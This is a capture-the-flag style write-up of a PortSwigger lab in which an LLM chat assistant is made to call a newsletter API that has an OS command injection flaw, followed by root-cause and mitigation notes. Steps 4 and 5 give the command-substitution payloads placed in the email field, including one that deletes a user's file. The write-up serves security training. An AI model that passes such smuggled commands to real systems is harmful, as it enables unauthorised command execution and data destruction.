# Lab 02: Exploiting Vulnerabilities in LLM APIs

![Difficulty](https://img.shields.io/badge/Difficulty-Practitioner-orange)
![Status](https://img.shields.io/badge/Status-Solved-brightgreen)
![Vulnerability](https://img.shields.io/badge/Vulnerability-OS%20Command%20Injection-red)

## 1. Lab Information

| Attribute | Details |
|---|---|
| **Platform** | PortSwigger Web Security Academy |
| **Category** | Web LLM Attacks |
| **Difficulty** | Practitioner |
| **Status** | Solved |
| **Vulnerability** | OS Command Injection |
| **Objective** | Delete `morale.txt` from Carlos' home directory using the LLM. |

## 2. Lab Overview

This lab demonstrates how vulnerabilities in backend APIs exposed to an LLM can be exploited to achieve remote code execution (RCE).

The application provides a Live Chat interface powered by an LLM that can interact with several backend APIs, including a Newsletter Subscription API.

The Newsletter Subscription API contains an OS command injection vulnerability. By manipulating the input passed to this API, an attacker can execute operating system commands through the LLM.

The objective was to exploit this vulnerability to delete the `morale.txt` file from Carlos' home directory.

## 3. Vulnerability Explained

**OS Command Injection** occurs when an application passes user-controlled input to an operating system command without properly validating or sanitizing it.

In this lab, the Newsletter Subscription API processes an email address using an operating system command.

Since the input is not properly sanitized, shell command substitution can be used to execute arbitrary commands on the server.

The LLM acts as an intermediary, allowing an attacker to interact with the vulnerable API through natural-language prompts.

## 4. Exploitation Process

### Step 1: Identify Available APIs

Navigate to the Live Chat interface and ask the LLM:

```text
What APIs do you have access to?
```

The LLM reveals three available APIs:

- Password Reset
- Newsletter Subscription
- Product Information

The Newsletter Subscription API was selected as the initial testing target because email-related functionality can involve operating system commands.

### Step 2: Identify API Arguments

Ask the LLM:

```text
What arguments does the Newsletter Subscription API accept?
```

The LLM explains that the API accepts an email address.

### Step 3: Test Normal API Functionality

Send a normal email address through the LLM:

```text
attacker@YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

Open the Email Client and observe that a subscription confirmation email has been generated.

This confirms that the LLM can invoke the Newsletter Subscription API and that the supplied email address is processed.

### Step 4: Test for OS Command Injection

Next, inject the `whoami` command using shell command substitution:

```bash
$(whoami)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

Ask the LLM to call the Newsletter Subscription API with this email address.

Open the Email Client and observe the resulting email address:

```text
carlos@YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

This indicates that the `whoami` command was executed successfully and its output was incorporated into the email address.

This confirms the presence of an OS command injection vulnerability and demonstrates that remote command execution is possible.

### Step 5: Exploit the Vulnerability

With command execution confirmed, use the following payload:

```bash
$(rm /home/carlos/morale.txt)@YOUR-EXPLOIT-SERVER-ID.exploit-server.net
```

Ask the LLM to call the Newsletter Subscription API using this input.

The shell executes the `rm` command, deleting `morale.txt` from Carlos' home directory.

### Step 6: Verify the Result

The lab is marked as solved after the target file is successfully deleted.

## 5. Root Cause

The primary vulnerability is OS command injection in the Newsletter Subscription API.

The main security weaknesses include:

- Passing user-controlled input to operating system commands.
- Insufficient input validation and sanitization.
- Unsafe construction of shell commands.
- Exposing vulnerable backend functionality through LLM-accessible APIs.

## 6. Key Takeaways

- Map the APIs and tools available to an LLM before attempting exploitation.
- LLM integrations can expose vulnerabilities in existing backend functionality.
- Email-related APIs can introduce command injection attack surfaces.
- Shell command substitution using `$()` can execute commands when input is interpreted by a vulnerable shell.
- The LLM can act as an intermediary for exploiting backend vulnerabilities.
- Always investigate the security of APIs exposed to LLMs, not just the LLM itself.

## 7. Mitigation

- Avoid executing operating system commands using user-controlled input.
- Use safe APIs and libraries instead of shell commands.
- Apply strict input validation.
- If shell execution is unavoidable, use secure argument handling and avoid shell interpretation.
- Restrict permissions of application processes.
- Apply the principle of least privilege to LLM-accessible APIs.
- Monitor and log suspicious API requests and command execution attempts.

## 8. References

- [PortSwigger – Exploiting Vulnerabilities in LLM APIs](https://portswigger.net/web-security/llm-attacks/lab-exploiting-vulnerabilities-in-llm-apis)
- [PortSwigger – OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [PortSwigger – Web LLM Attacks](https://portswigger.net/web-security/llm-attacks)
